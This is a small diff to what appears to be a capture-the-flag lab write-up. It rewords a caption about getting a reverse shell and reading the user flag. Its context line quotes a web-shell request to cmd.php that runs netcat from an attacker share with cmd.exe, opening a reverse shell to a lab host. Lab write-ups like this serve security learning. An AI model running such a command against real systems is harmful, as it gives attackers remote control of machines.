@@ -99,7 +99,7 @@ http://10.10.10.9/cmd.php?cmd=\\10.10.14.24\win\nc.exe -e cmd.exe 10.10.14.24 44
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dcb8eaec-0ef3-4de7-b6ac-29859f8eecd4)
 
-Read user flag:
+Get the revershell, and read user flag:
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/652b50a0-4934-4ecd-8c70-20636bc5ac0d)
 
